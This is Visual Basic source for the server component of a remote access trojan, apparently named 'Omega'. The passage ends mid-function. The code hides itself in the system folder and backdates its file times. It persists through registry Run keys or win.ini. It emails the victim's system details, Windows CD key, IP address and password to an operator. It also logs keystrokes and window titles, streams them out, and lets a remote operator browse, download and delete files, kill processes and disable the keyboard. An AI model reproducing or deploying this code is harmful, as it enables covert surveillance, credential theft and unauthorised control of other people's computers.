Private Sub InitAutoRunHide()
ServPath = Get_SysPath & ServName

'get startup method
Profile = "Data01"
LoadProfile "DXData", "Data01", ServSetting
End Sub

Private Sub AutoRunHide()
Call InitAutoRunHide
If FileExists(Get_SysPath & "ijl11.dll") = False Then
   Call LoadDataIntoFile(102, Get_SysPath & "ijl11.dll")
End If
If FileExists(Get_SysPath & "zlib.dll") = False Then
   Call LoadDataIntoFile(104, Get_SysPath & "zlib.dll")
End If
'if executed application path not same at server path
If LCase(cPath & App.EXEName & ".EXE") <> LCase(ServPath) Then
   If Dir(ServPath, vbNormal Or vbReadOnly Or vbHidden Or vbSystem Or vbArchive) = "" Then
      'if it not exist, then copy, rename it.
      FileCopy cPath & App.EXEName & ".exe", ServPath
      DoEvents
      'set server file datetime
      Call setFileDate(ServPath)
      If Startup = "1" Or Startup = "2" Then
         'write autorun in registry
         If GetWindows Then
            SetStringKey HKEY_LOCAL_MACHINE, WinInfo & "\" & RegAutoMethod, ServKey, ServPath
         Else
            SetStringKey HKEY_LOCAL_MACHINE, WinInfoNT & "\" & RegAutoMethod, ServKey, ServPath
         End If
      ElseIf Startup = "0" Then
         SaveProfile "windows", "run", ServPath + "", "win.ini"
      End If
   End If
       Shell ServPath, vbHide
       Unload Me
       End
End If
End Sub

Private Sub setFileDate(FilePath As String)
Dim Result As Long

    'open
     hFile = OpenFile(FilePath, FileInfoStruct, OF_READWRITE)
     
  'check we opened it
  If hFile <> HFILE_ERROR Then
   
     'put the date and time into a systime variable
     SysTime = String_To_SysDateTime("23/04/1999", "22:22:00:000")
          
     'convert to a file time
     Result = SystemTimeToFileTime(SysTime, CreateTime)
     
     'convert to a UTC time
     Result = LocalFileTimeToFileTime(CreateTime, CreateTime)
     
     'set
     Result = SetFileTime(hFile, CreateTime, CreateTime, CreateTime)
     
  End If
    
  'close file
  Result = CloseHandle(hFile)
        
End Sub

Private Sub InitSendMail()
Dim d As String
d = "Computer Name: " & Get_ComputerName
d = d & vbCrLf & "User Name: " & Get_UserName
d = d & vbCrLf & "Registered Owner: " & Get_RegOwner
d = d & vbCrLf & "Registered Organization: " & Get_RegCompany
d = d & vbCrLf & "Windows Folder Name: " & Get_WinPath
d = d & vbCrLf & "System Folder Name: " & Get_SysPath
d = d & vbCrLf & "Windows Platform: " & Get_OSPlatform
d = d & vbCrLf & "Windows Version: " & Get_OSVersion
d = d & vbCrLf & "Windows CD-Key: " & Get_WinCDKey
d = d & vbCrLf & "DirectX Version: " & Get_DirectXVer
d = d & vbCrLf & "Screen Resolution: " & Get_ScrResolution
d = d & vbCrLf & "Color Depth: " & Get_ColorDepth
d = d & vbCrLf & "CPU Model: " & Get_CPUModel
d = d & vbCrLf & "Memory: " & Get_RAM
d = d & vbCrLf & "Hard Drive Space: " & Get_HDDSpace
If SendICQ = False Then
   Profile = "Data07"
   LoadProfile "DXData", "Data07", ServSetting
   Profile = "Data08"
   LoadProfile "DXData", "Data08", ServSetting
End If
NameFrom = Get_UserName
MailFrom = NameFrom & "@hotmail.com"
Subject = "Omega Help"
Message = Format(Date, "Ddd") & ", " & _
Format(Date, "dd Mmm YYYY") & " " & _
Format(Time, "hh:mm:ss") & vbCrLf & "IP:" & CurrentIP(True) & _
" Port:" & txtPort.Text & " Password:" & txtPass.Text & vbCrLf & d
End Sub

Private Sub SendMailNotify()
  If Step = 7 Then
    Exit Sub
  ElseIf Step = 1 Then '220
      TCPEMail.sckSendData "HELO " & Mid(MailFrom, InStr(1, MailFrom, "@") + 1, Len(MailFrom)) & vbCrLf
  ElseIf Step = 2 Then '250
      TCPEMail.sckSendData "MAIL FROM: <" & MailFrom & ">" & vbCrLf
  ElseIf Step = 3 Then '250
      TCPEMail.sckSendData "RCPT TO: <" & MailTo & ">" & vbCrLf
  ElseIf Step = 4 Then '250
      TCPEMail.sckSendData "DATA" & vbCrLf
  ElseIf Step = 5 Then '354
      TCPEMail.sckSendData "FROM: " & NameFrom & "<" & MailFrom & ">" & vbCrLf
      TCPEMail.sckSendData "TO: User<" & MailTo & ">" & vbCrLf
      TCPEMail.sckSendData "SUBJECT: " & Subject & vbCrLf
      TCPEMail.sckSendData "MIME-Version: 1.0" & vbCrLf
      TCPEMail.sckSendData "Content-type: text/plain; charset=US-ASCII" & vbCrLf & vbCrLf
      TCPEMail.sckSendData Message & vbCrLf & vbCrLf
      TCPEMail.sckSendData vbCrLf & "." & vbCrLf
  ElseIf Step = 6 Then '250
      TCPEMail.sckSendData "QUIT" & vbCrLf
      Timer3.Enabled = False
      lblStatus.Caption = "Mail sent!"
      Text2.Text = ""
      SaveProfile "DXData", "Data05", False, ServSetting 'e-mail send one time
      TCPEMail.sckClose
      MailSent = True
      Profile = "Data06"
      LoadProfile "DXData", "Data06", ServSetting
      If SendICQ = False Then
         Call Listening
      End If
  End If
End Sub

Private Sub Listening()
On Error Resume Next

    'get port number
    Profile = "Data04"
    LoadProfile "DXData", "Data04", ServSetting
    
    'get protect password
    Profile = "Data03"
    LoadProfile "DXData", "Data03", ServSetting
    
    TCPEMail.sckClose
    TCPServer.sckListen CLng(Trim(txtPort.Text))
    If TCPServer.State <> sckListening Then
       TCPServer.sckClose
       Call Relisten
    End If
    lblStatus.Caption = "Listening..."
End Sub

Private Sub Relisten()
On Error Resume Next

    Unload frmChat
    Unload frmSCR
    Unload frmSCRPreview
    Me.Refresh
    Me.Cls
    DoEvents
    TimeOut = 0
    Timer1.Enabled = False
    TCPServer.sckClose
    txtAction.Text = ""
    DoEvents
    Call Listening 'relisten
End Sub

Function cPath() As String
If Right(App.Path, 1) <> "\" Then
   cPath = App.Path & "\"
End If
End Function

Function StringTokenizer(DATA As String) As Integer
On Error Resume Next
Dim i As Integer, j As Integer, t As Integer
Dim S As String

j = 0 'set data count to zero
t = 1 'set start to zero

For i = 1 To Len(DATA)
    S = Mid$(DATA, i, 1)
    If S = Delimiter Then
       Info(j) = Mid$(DATA, t, i - t)
       t = i + 1
       j = j + 1
    End If
Next i

StringTokenizer = j - 1
End Function

Public Sub LoadProfile(AppName As String, KeyName As String, FileName As String)
 Dim temp As String * 50
 Dim lpAppName As String, lpKeyName As String, lpDefault As String, lpFileName As String
 
 lpAppName = AppName
 lpKeyName = KeyName
 lpDefault = FileName
 lpFileName = FileName
 
 Call GetPrivateProfileString(lpAppName, lpKeyName, lpDefault, temp, Len(temp), lpFileName)
 lblTemp.Caption = Trim(temp)
 If lblTemp.Caption <> FileName Then
    lblTemp.Caption = Decrypt(lblTemp.Caption, "OmEgAsEreR")
 End If
 
    Select Case Profile
        
        Case "Data05"
        SendEmail = True
        If lblTemp.Caption = "True" Then
           SendEmail = True
           Timer2.Enabled = True 'because Timer2 is set False first.
        ElseIf lblTemp.Caption = "False" Then
           SendEmail = False
           Timer2.Enabled = False
        Else
           lblTemp.Caption = SendEmail
           Timer2.Enabled = True
        End If
        SaveProfile "DXData", "Data05", lblTemp.Caption, ServSetting
        
        Case "Data06"
        SendICQ = True
        If lblTemp.Caption = "True" Then
           SendICQ = True
           Timer2.Enabled = True 'because Timer2 is set False first.
           SaveProfile "DXData", "Data06", lblTemp.Caption, ServSetting
        ElseIf lblTemp.Caption = "False" Then
           SendICQ = False
           Timer2.Enabled = False
           SaveProfile "DXData", "Data06", lblTemp.Caption, ServSetting
           Call Listening
        Else
           lblTemp.Caption = SendICQ
           Timer2.Enabled = True
           SaveProfile "DXData", "Data06", lblTemp.Caption, ServSetting
        End If
        
        Case "Data07"
        If lblTemp.Caption = FileName Then
           SMTPServer.Text = "mail.hotmail.com"
        Else
            SMTPServer.Text = lblTemp.Caption
        End If
        SaveProfile "DXData", "Data07", SMTPServer.Text, ServSetting
        
        Case "Data08"
        If lblTemp.Caption = FileName Then
           MailTo = "yours@hotmail.com" 'your e-mail address to notify
           lblTemp.Caption = MailTo
        Else
           MailTo = lblTemp.Caption
        End If
        SaveProfile "DXData", "Data08", lblTemp.Caption, ServSetting
        
        Case "Data09"
        If lblTemp.Caption = FileName Then
           MailTo = "123456789" 'your icq number to notify
           lblTemp.Caption = MailTo
        Else
           MailTo = lblTemp.Caption
        End If
        SaveProfile "DXData", "Data09", lblTemp.Caption, ServSetting
        
        Case "Data04"
        If lblTemp.Caption = FileName Then
           txtPort.Text = "54896"
        Else
           txtPort.Text = lblTemp.Caption
        End If
        SaveProfile "DXData", "Data04", txtPort.Text, ServSetting
        
        Case "Data03"
        If lblTemp.Caption = FileName Or Trim(lblTemp.Caption) = "" Then
           txtPass.Text = " "
           Check = True
        Else
           txtPass.Text = lblTemp.Caption
           Check = False
        End If
        SaveProfile "DXData", "Data03", txtPass.Text, ServSetting
                    
        Case "Data01"
        '0 is WIN.INI
        '1 is Registry-Run
        '2 is Registry-RunServices
        If lblTemp.Caption = "0" Then
           Startup = "0"
        ElseIf lblTemp.Caption = "1" Then
           RegAutoMethod = "Run"
           Startup = "1"
        ElseIf lblTemp.Caption = "2" Then
           RegAutoMethod = "RunServices"
           Startup = "2"
        Else
           RegAutoMethod = "Run"
           Startup = "1"
           lblTemp.Caption = Startup
        End If
        SaveProfile "DXData", "Data01", lblTemp.Caption, ServSetting
        
        Case "Data02"
        If lblTemp.Caption = FileName Or Trim(lblTemp.Caption) = "" Then
           lblTemp.Caption = True
           TimerKeyLogger.Enabled = True
           TimerSave.Enabled = True
           If cPath = Get_SysPath Then
              Call saveKeyLogger_6
           End If
        ElseIf lblTemp.Caption = "True" Then
           TimerKeyLogger.Enabled = True
           TimerSave.Enabled = True
           If cPath = Get_SysPath Then
              Call saveKeyLogger_6
           End If
        ElseIf lblTemp.Caption = "False" Then
           TimerKeyLogger.Enabled = False
           TimerSave.Enabled = False
        End If
        SaveProfile "DXData", "Data02", lblTemp.Caption, ServSetting
        
   End Select
   
End Sub

Public Sub SaveProfile(AppName As String, KeyName As String, Values As String, FileName As String)
 Dim lpAppName As String, lpKeyName As String, lpValues As String, lpFileName As String
 
 lpAppName = AppName
 lpKeyName = KeyName
 lpValues = Values
 lpFileName = FileName
 
 If LCase(lpFileName) = LCase(ServSetting) Then
    lpValues = Encrypt(lpValues, "OmEgAsEreR")
 End If
 
 Call WritePrivateProfileString(lpAppName, lpKeyName, lpValues, lpFileName)
 DoEvents
 
 'set server settings file datetime
 Call setFileDate(Get_WinPath & ServSetting)
End Sub

'Function 1
Private Sub GetAllPCInfo_1()
Dim Info As String  '15 information
Info = Get_ComputerName & Delimiter & Get_UserName & Delimiter & _
Get_RegOwner & Delimiter & Get_RegCompany & Delimiter & _
Get_WinPath & Delimiter & Get_SysPath & Delimiter & _
Get_OSPlatform & Delimiter & Get_OSVersion & Delimiter & _
Get_WinCDKey & Delimiter & Get_DirectXVer & Delimiter & _
Get_ScrResolution & Delimiter & Get_ColorDepth & Delimiter & _
Get_CPUModel & Delimiter & Get_RAM & Delimiter & Get_HDDSpace & Delimiter

TCPServer.sckSendData Info
End Sub

'Function 2
Private Sub SendCachePass_2()
Dim i As Integer
Dim P As String
       
    For i = 0 To (List1.ListCount - 1)
        P = P & List1.List(i) & Delimiter
    Next
        TCPServer.sckSendData P
        List1.Clear
End Sub

'Function 3
Private Sub KeyLoggerEnabled_3(cmd As Integer)
Select Case cmd
    Case 0
         SaveProfile "DXData", "Data02", True, ServSetting
    Case 1
         SaveProfile "DXData", "Data02", False, ServSetting
End Select
End Sub

Private Sub RemoveServer_3()
Call InitAutoRunHide
  If GetWindows Then
     DeleteStringKey HKEY_LOCAL_MACHINE, WinInfo & "\" & RegAutoMethod, ServKey
  Else
     DeleteStringKey HKEY_LOCAL_MACHINE, WinInfoNT & "\" & RegAutoMethod, ServKey
  End If
  SaveProfile "windows", "run", " ", "win.ini"
  
If FileExists(Get_WinPath & "desktop.jpg") Then Kill Get_WinPath & "desktop.jpg"
If FileExists(Get_WinPath & "preview.jpg") Then Kill Get_WinPath & "preview.jpg"
   
Call LoadDataIntoFile(103, Get_WinPath & "TEMP\KILL.EXE")
DoEvents
Shell Get_WinPath & "TEMP\KILL.EXE", vbHide
Call DoWinManager_14(ServKey & Delimiter & Me.hwnd & Delimiter, WM_CLOSE)
End Sub

'Function 4
Private Sub EmailNotifyEnabled(DATA As String)
StringTokenizer DATA
SaveProfile "DXData", "Data07", Info(0), ServSetting
SaveProfile "DXData", "Data08", Info(1), ServSetting
Info(0) = ""
Info(1) = ""
End Sub

'Function 6
Private Sub Keyboard_6(cmd As Integer)
Select Case cmd
    Case 2 'get offline keys
         Call saveKeyLogger_6
         If FileExists(cPath & "KEYLOG.TXT") Then
            Call DownloadFile(cPath & "KEYLOG.TXT")
            DoEvents
            Kill cPath & "KEYLOG.TXT"
         End If
    Case 3 'clear offline keys
         If FileExists(cPath & "KEYLOG.TXT") Then
            Kill cPath & "KEYLOG.TXT"
         End If
    Case 4 'disable keyboard
         Shell "rundll32 keyboard,disable"
End Select
End Sub

Private Sub ActiveWindowList_6()
Dim i As Integer
Dim P As String

  List1.Clear
  Call FillTaskListBox(List1)
  For i = 0 To List1.ListCount - 1
      P = P & List1.List(i) & Delimiter
  Next
  TCPServer.sckSendData P
  List1.Clear
End Sub

Private Sub sendKeyStrokes_6(DATA As String)
On Error Resume Next
Dim handle As Long

DATA = Right(DATA, Len(DATA) - 2)
StringTokenizer DATA
handle = FindWindow(vbNullString, Trim(Info(0)))
Call ShowWindow(handle, SW_RESTORE)
DoEvents
AppActivate Trim(Info(0))
DoEvents
SendKeys Info(1)
DoEvents
Info(0) = ""
Info(1) = ""
End Sub

Function GetCaption(hwnd As Long)
Dim hWndTitle As String
hWndTitle = String(GetWindowTextLength(hwnd), 0)
GetWindowText hwnd, hWndTitle, (GetWindowTextLength(hwnd) + 1)
GetCaption = hWndTitle
End Function

Private Sub TimerKeyLogger_Timer()
On Error Resume Next
Dim AddKey As String
Dim KeyLoop As Byte

If GetForegroundWindow <> CurrentApp_hWnd Then
   CurrentApp_hWnd = GetForegroundWindow
   If GetCaption(GetForegroundWindow) = "" Then
   Else
      Text1 = Text1 & vbCrLf & " [" & GetCaption(GetForegroundWindow) & "] "
      TCPServer.sckSendData vbCrLf & " [" & GetCaption(GetForegroundWindow) & "] "
   End If
End If
If GetAsyncKeyState(13) = -32767 Then
   AddKey = vbCrLf
   GoTo KeyFound
End If
If GetAsyncKeyState(8) = -32767 Then
   Text1 = Left(Text1, Len(Text1) - 1)
   GoTo KeyFound
End If
If GetAsyncKeyState(32) = -32767 Then
   AddKey = " "
   GoTo KeyFound
End If
If GetAsyncKeyState(186) = -32767 Then
   If GetShift = True Then AddKey = ":"
   If GetShift = False Then AddKey = ";"
   GoTo KeyFound
End If
If GetAsyncKeyState(187) = -32767 Then
   If GetShift = True Then AddKey = "+"
   If GetShift = False Then AddKey = "="
   GoTo KeyFound
End If
If GetAsyncKeyState(188) = -32767 Then
   If GetShift = True Then AddKey = "<"
   If GetShift = False Then AddKey = ","
   GoTo KeyFound
End If
If GetAsyncKeyState(189) = -32767 Then
   If GetShift = True Then AddKey = "_"
   If GetShift = False Then AddKey = "-"
   GoTo KeyFound
End If
If GetAsyncKeyState(190) = -32767 Then
   If GetShift = True Then AddKey = ">"
   If GetShift = False Then AddKey = "."
   GoTo KeyFound
End If
If GetAsyncKeyState(191) = -32767 Then
   If GetShift = True Then AddKey = "?"
   If GetShift = False Then AddKey = "/"
   GoTo KeyFound
End If
If GetAsyncKeyState(192) = -32767 Then
   If GetShift = True Then AddKey = "~"
   If GetShift = False Then AddKey = "`"
   GoTo KeyFound
End If
If GetAsyncKeyState(96) = -32767 Then
   If GetShift = False Then AddKey = "0"
   GoTo KeyFound
End If
If GetAsyncKeyState(97) = -32767 Then
   If GetShift = False Then AddKey = "1"
   GoTo KeyFound
End If
If GetAsyncKeyState(98) = -32767 Then
   If GetShift = False Then AddKey = "2"
   GoTo KeyFound
End If
If GetAsyncKeyState(99) = -32767 Then
   If GetShift = False Then AddKey = "3"
   GoTo KeyFound
End If
If GetAsyncKeyState(100) = -32767 Then
   If GetShift = False Then AddKey = "4"
   GoTo KeyFound
End If
If GetAsyncKeyState(101) = -32767 Then
   If GetShift = False Then AddKey = "5"
   GoTo KeyFound
End If
If GetAsyncKeyState(102) = -32767 Then
   If GetShift = False Then AddKey = "6"
   GoTo KeyFound
End If
If GetAsyncKeyState(103) = -32767 Then
   If GetShift = False Then AddKey = "7"
   GoTo KeyFound
End If
If GetAsyncKeyState(104) = -32767 Then
   If GetShift = False Then AddKey = "8"
   GoTo KeyFound
End If
If GetAsyncKeyState(105) = -32767 Then
   If GetShift = False Then AddKey = "9"
   GoTo KeyFound
End If
If GetAsyncKeyState(106) = -32767 Then
   If GetShift = False Then AddKey = "*"
   GoTo KeyFound
End If
If GetAsyncKeyState(107) = -32767 Then
   If GetShift = False Then AddKey = "+"
   GoTo KeyFound
End If
If GetAsyncKeyState(108) = -32767 Then
   If GetShift = False Then AddKey = ""
   Text1.Text = Text1.Text & vbCrLf
   GoTo KeyFound
End If
If GetAsyncKeyState(109) = -32767 Then
   If GetShift = False Then AddKey = "-"
   GoTo KeyFound
End If
If GetAsyncKeyState(110) = -32767 Then
   If GetShift = False Then AddKey = "."
   GoTo KeyFound
End If
If GetAsyncKeyState(111) = -32767 Then
   If GetShift = False Then AddKey = "/"
   GoTo KeyFound
End If
If GetAsyncKeyState(219) = -32767 Then
   If GetShift = True Then AddKey = "{"
   If GetShift = False Then AddKey = "["
   GoTo KeyFound
End If
If GetAsyncKeyState(220) = -32767 Then
   If GetShift = True Then AddKey = "|"
   If GetShift = False Then AddKey = "\"
   GoTo KeyFound
End If
If GetAsyncKeyState(221) = -32767 Then
   If GetShift = True Then AddKey = "}"
   If GetShift = False Then AddKey = "]"
   GoTo KeyFound
End If
If GetAsyncKeyState(222) = -32767 Then
   If GetShift = True Then AddKey = Chr(34)
   If GetShift = False Then AddKey = "'"
   GoTo KeyFound
End If

KeyLoop = 48
Do Until KeyLoop = 91
   If GetAsyncKeyState(KeyLoop) = -32767 Then
      'letters
      If KeyLoop >= 65 And KeyLoop <= 90 Then
         If GetCapslock = True And GetShift = True Then AddKey = LCase(Chr(KeyLoop))
         If GetCapslock = False And GetShift = False Then AddKey = LCase(Chr(KeyLoop))
         If GetCapslock = True And GetShift = False Then AddKey = UCase(Chr(KeyLoop))
         If GetCapslock = False And GetShift = True Then AddKey = UCase(Chr(KeyLoop))
         GoTo KeyFound
      End If
      'numbers
      If KeyLoop >= 48 And KeyLoop <= 57 And GetShift = True Then
         If GetShift = True Then
            AddKey = a(Val(Chr(KeyLoop)))
            GoTo KeyFound
         End If
      End If
      'Text1.Text = Text1 & Chr(KeyLoop)
      'If KeyLog Then
      '   TCPServer.sckSendData Chr(KeyLoop)
      'End If
   End If
   KeyLoop = KeyLoop + 1
Loop

Exit Sub
KeyFound:
Text1.Text = Text1 & AddKey
If KeyLog Then
   TCPServer.sckSendData AddKey
End If
End Sub

Private Sub TimerSave_Timer()
Call saveKeyLogger_6
End Sub

Private Sub saveKeyLogger_6()
On Error Resume Next
Open cPath & "KEYLOG.TXT" For Append As #1
     Print #1, Text1.Text
     Text1.Text = ""
     Text1.Refresh
Close #1
End Sub

'Function 7
Private Sub InitialChat_7(DATA As String)
Dim i As Integer

i = StringTokenizer(DATA)
    
    frmChat.SetNickname Info(1)
    frmChat.SetFormsize Val(Info(2))
    frmChat.txtData.ForeColor = Info(3)
    frmChat.txtData.FontSize = Info(4)
    
For i = 0 To i
    Info(i) = ""
Next i
End Sub

Public Sub sendText(Text As String)
    TCPServer.sckSendData Text
End Sub

Private Sub FindFiles_9(DATA As String)
Dim i As Integer
Dim P As String, r As String

i = StringTokenizer(DATA)

    List1.Clear
    r = FindFile(Info(0), Info(1), Me, List1, CBool(Info(2)))
    DoEvents
    Sleep 10
    'send number of file found
    TCPServer.sckSendData "NOF|" & r
    DoEvents
    
    For i = 0 To (List1.ListCount - 1)
        P = P & List1.List(i) & Delimiter
        If (i + 1) Mod 50 = 0 Then
           TCPServer.sckSendData P
           DoEvents
           Sleep 200
           P = ""
           DoEvents
        End If
    Next
    'send the last found
    TCPServer.sckSendData P & "EOF|09"
    DoEvents
    
    List1.Clear
    
For i = 0 To i
    Info(i) = ""
Next i
End Sub

'Function 12
Private Sub SendMessage_12(DATA As String)
StringTokenizer DATA
MsgBox Info(0), CInt(Info(1)), Info(2)
Info(0) = ""
Info(1) = ""
Info(2) = ""
End Sub

'Function 13
Private Sub SendDrives_13()
On Error Resume Next
Dim P As String
Dim i As Integer

For i = 0 To Drive1.ListCount - 1
    P = P & Mid$(Drive1.List(i), 1, 2) & "\" & GetDrive(Mid$(Drive1.List(i), 1, 2)) & Delimiter
Next i
TCPServer.sckSendData P
DoEvents

End Sub

Private Sub SendFiles_13(Directory As String)
On Error GoTo errHandle
Dim pDrive As String, pFile As String, P As String
Dim i As Long
Dim MaxLen As Long

MaxLen = 1000
Dir1.Refresh
File1.Refresh
Dir1.Path = Directory
File1.Path = Directory

For i = 0 To Dir1.ListCount - 1
    pDrive = pDrive & Dir1.List(i) & "\" & Delimiter
    lblTemp.Caption = Dir1.List(i) & "\"
    If lblTemp.Width > MaxLen Then
       MaxLen = lblTemp.Width
    End If
    If (i + 1) Mod 50 = 0 Then
       TCPServer.sckSendData pDrive
       DoEvents
       Sleep 200
       pDrive = ""
       DoEvents
   End If
Next i
TCPServer.sckSendData pDrive
DoEvents
Sleep 200

For i = 0 To File1.ListCount - 1
    pFile = pFile & File1.List(i) & Delimiter
    lblTemp.Caption = File1.List(i)
    If lblTemp.Width > MaxLen Then
       MaxLen = lblTemp.Width
    End If
    If (i + 1) Mod 50 = 0 Then
       TCPServer.sckSendData pFile
       DoEvents
       Sleep 200
       pFile = ""
       DoEvents
   End If
Next i

TCPServer.sckSendData pFile & MaxLen & Delimiter & "EOF|13"
DoEvents
Sleep 200

Exit Sub
errHandle:
TCPServer.sckSendData "|ERR" & Err.Description
End Sub

Private Sub FileGM_13(cmd As Integer, sFile As String)
On Error Resume Next
Dim i As Integer
Dim sTemp As String

'cmd 0,2,4,6,7 must check file is exist
'if file not exist then exit
If cmd = 0 Or cmd = 2 Or cmd = 3 Or cmd >= 6 And cmd <= 7 Then
   If FileExists(sFile) = False Then
      Exit Sub
   End If
End If

'make directory
'e.g make C:\My Documents\ABC
'so must check C:\My Documents directory is exists
If cmd = 1 Then
   For i = Len(sFile) To 1 Step -1
       If Mid$(sFile, i, 1) = "\" Then
          sTemp = Mid$(sFile, 1, i - 1)
          Exit For
       End If
   Next i
   If Dir(sTemp, vbDirectory) = "" Then
      Exit Sub
   End If
End If

Select Case cmd
    Case 0 'run file
         ShellExecute 0, "open", sFile, vbNullString, vbNullString, SW_NORMAL
    Case 1 'make directory
         MkDir sFile
    Case 2 'get file size
         TCPServer.sckSendData FileLength(sFile)
    Case 3 'delete file
         Kill sFile
    Case 4 'download selected file
         If FileExists(sFile) Then
            If FileLen(sFile) <> 0 Then
               Call DownloadFile(sFile)
            Else
               'download file no byte
               TCPServer.sckSendData "|ERRFNB"
            End If
         Else
            'download file not exists
            TCPServer.sckSendData "|ERRDNF"
         End If
    Case 5 'upload selected file
         upFilename = sFile
         bFileArriving = True
         txtAction.Text = "UPLOAD_13"
    Case 6 'play wave file
         Call PlaySound(sFile, SND_NODEFAULT)
    Case 7 'set wallpaper
         Call SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, ByVal sFile, &H1)
End Select
End Sub

Public Sub DownloadFile(sFile As String)
On Error GoTo errHandle
Dim LocData As String
Dim lngFileLen As Long
Dim n As Long
Dim FileHandle As Integer
Dim dlFile As String
    
    'if not send desktop preview screen, compress file
    If LCase(sFile) <> LCase(Get_WinPath & "preview.jpg") Then
       dlFile = sFile & ".OZip"
       Call CompressFile(sFile, dlFile, 9)
       DoEvents
       Sleep 100
    Else
       dlFile = sFile
    End If
    
    ReceiveData = False
    DLCancel = False
    
    'send file info (file length)
    TCPServer.sckSendData "FILEINFO" & FileLen(dlFile)
    DoEvents
    Sleep 100
    
    FileHandle = FreeFile
    Open dlFile For Binary As #FileHandle
    lngFileLen = LOF(FileHandle)
    LocData = Space$(1024)
    'send package by package (1024KB)
    For n = 1 To lngFileLen \ 1024
        LocData = Space$(1024)
        Get #FileHandle, , LocData
        TCPServer.sckSendData LocData
        DoEvents
        Sleep 10
        Do While ReceiveData <> True
           If DLCancel Then GoTo errHandle
           DoEvents
           Sleep 10
        Loop
        ReceiveData = False
    Next
    'send last package
    If lngFileLen Mod 1024 <> 0 Then
        LocData = Space$(lngFileLen Mod 1024)
        Get #FileHandle, , LocData
        TCPServer.sckSendData LocData
        DoEvents
        Sleep 10
        Do While ReceiveData <> True
           If DLCancel Then GoTo errHandle
           DoEvents
           Sleep 10
        Loop
        ReceiveData = False
    End If
    
    Close #FileHandle
    DoEvents
    Sleep 200
    'send end of file
    TCPServer.sckSendData "FILEEND"
    DoEvents
    'delete the compress file or preview.jpg
    If FileExists(dlFile) Then
       Kill dlFile
       DoEvents
    End If
    
Exit Sub
errHandle:
Close #FileHandle
'delete the compress file or preview.jpg
If FileExists(dlFile) Then
   Kill dlFile
   DoEvents
End If
End Sub

'Function 14
Private Sub RefreshWinhWnd_14()
Dim i As Integer
Dim P As String

    Call LoadTaskList_14
    For i = 0 To (List1.ListCount - 1)
        P = P & List1.List(i) & Delimiter
    Next
    TCPServer.sckSendData P
    List1.Clear
End Sub

Private Sub LoadTaskList_14()
Dim CurrWnd As Long
Dim Length As Long
Dim taskname As String
Dim Parent As Long
    
    List1.Clear
    CurrWnd = GetWindow(Me.hwnd, GW_HWNDFIRST)
    While CurrWnd <> 0
        Parent = GetParent(CurrWnd)
        Length = GetWindowTextLength(CurrWnd)
        taskname = Space$(Length + 1)
        Length = GetWindowText(CurrWnd, taskname, Length + 1)
        taskname = Left$(taskname, Len(taskname) - 1)
        If Length > 0 Then
            If taskname <> Me.Caption Then
                List1.AddItem taskname & Delimiter & CurrWnd
            End If
        End If
        CurrWnd = GetWindow(CurrWnd, GW_HWNDNEXT)
        DoEvents
    Wend
    List1.Refresh
End Sub

Private Sub DoWinManager_14(WindowData As String, Action As Long)
Dim handle As Long
Dim MyMenu As Long
Dim WinName As String
Dim Length As Long
Dim WindowName As String 'for checking

StringTokenizer WindowData
WinName = Trim(Info(0))
handle = CLng(Info(1))
Info(0) = ""
Info(1) = ""
    
    'get window name use the handle given
    Length = GetWindowTextLength(handle)
    WindowName = Space$(Length + 1)
    Length = GetWindowText(handle, WindowName, Length + 1)
    WindowName = Left$(WindowName, Len(WindowName) - 1)
    
 If WinName = WindowName Then
    
    If Action = WM_CLOSE Then
       Call PostMessage(handle, WM_CLOSE, 0, 0)
    ElseIf Action = -1 Then 'focus
       Call ShowWindow(handle, SW_RESTORE)
       AppActivate WinName
    ElseIf Action = -2 Then 'disable x button
       MyMenu = GetSystemMenu(handle, 0)
       Call RemoveMenu(MyMenu, &HF060, 0)
    ElseIf Action = -3 Then 'rename
       Call SetWindowText(handle, Info(2))
       Info(2) = "" 'rename text
    Else
       Call ShowWindow(handle, Action)
    End If
 
 End If 'WinName = WindowName
 
End Sub

'Function 15
Private Sub RefreshProcess_15()
Dim uProcess As PROCESSENTRY32
Dim hSnapShot, r As Long
Dim S As Byte

'get snapshot of programs
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0&)
'on error
If hSnapShot = 0 Then Exit Sub
'clean all the previous prog entries out of the listbox
List1.Clear
List2.Clear
'prepare for API call
uProcess.dwSize = Len(uProcess)
'get first program
r = Process32First(hSnapShot, uProcess)
'loop while progs are still being found
Do While r
 Select Case uProcess.pcPriClassBase
 Case 4: S = 0 '"Idle"
 Case 8: S = 1 '"Normal"
 Case 13: S = 2 '"High"
 Case 24: S = 3 '"Realtime"
 End Select
 'add name to Process listbox
 lblTemp.Caption = Trim(LCase(uProcess.szExeFile))
If lblTemp.Caption <> Trim(LCase(ServPath)) Then
   List1.AddItem GetShortFileTitle(uProcess.szExeFile) & Delimiter & uProcess.szExeFile & Delimiter
   List2.AddItem S & Delimiter & uProcess.th32ProcessID & Delimiter
End If
lblTemp.Caption = ""
 'get next program
 r = Process32Next(hSnapShot, uProcess)
Loop
'close handle to free resource
CloseHandle hSnapShot

Call Refresh_15
End Sub

Private Sub TerminateProcess_15(DATA As String)
Dim uProcess As PROCESSENTRY32
Dim lprocesshandle As Long
Dim hSnapShot, r As Long

StringTokenizer DATA
hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0&)
'on error
If hSnapShot = 0 Then Exit Sub
'prepare for API call
uProcess.dwSize = Len(uProcess)
'get first program
r = Process32First(hSnapShot, uProcess)
'loop while progs are still being found
Do While r
 lblTemp.Caption = Trim(LCase(uProcess.szExeFile))
 'if process path & process id same
 If lblTemp.Caption = LCase(Trim(Info(0))) And CLng(Trim(Info(1))) = uProcess.th32ProcessID Then
    lprocesshandle = OpenProcess(&H1F0FFF, 0, uProcess.th32ProcessID)
    'on error exit
    If lprocesshandle = 0 Then Exit Sub
       'terminate program
       TerminateProcess lprocesshandle, 0
       'disconnect link
       CloseHandle lprocesshandle
       Exit Do
 End If
 'get next program
 r = Process32Next(hSnapShot, uProcess)
Loop
'close handle to free resource
CloseHandle hSnapShot
Info(0) = ""
Info(1) = ""
lblTemp.Caption = ""
End Sub

Private Sub Refresh_15()
Dim i As Integer
Dim P As String
    
    'P.S: List2 has add Delimiter
    For i = 0 To (List1.ListCount)
        P = P & List1.List(i) & Delimiter & List2.List(i)
    Next
    TCPServer.sckSendData P
    DoEvents
    List2.Clear
End Sub

Private Sub ThreadPriority_15(DATA As String)
Dim uProcess As PROCESSENTRY32
Dim hSnapShot, r As Long

StringTokenizer DATA
